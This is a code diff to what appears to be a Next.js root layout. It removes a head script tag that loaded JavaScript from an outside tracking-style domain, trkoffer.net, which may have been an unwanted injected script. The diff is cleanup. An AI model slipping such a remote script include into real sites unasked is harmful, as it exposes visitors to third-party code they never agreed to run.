@@ -45,14 +45,6 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en" className={`${inter.className} bg-background`}>
-      <head>
-        <script
-          type="text/javascript"
-          id="ogjs"
-          src="https://trkoffer.net/cl/js/o4mqod"
-        />
-      </head>
-
       <body className="antialiased">
         {children}
 
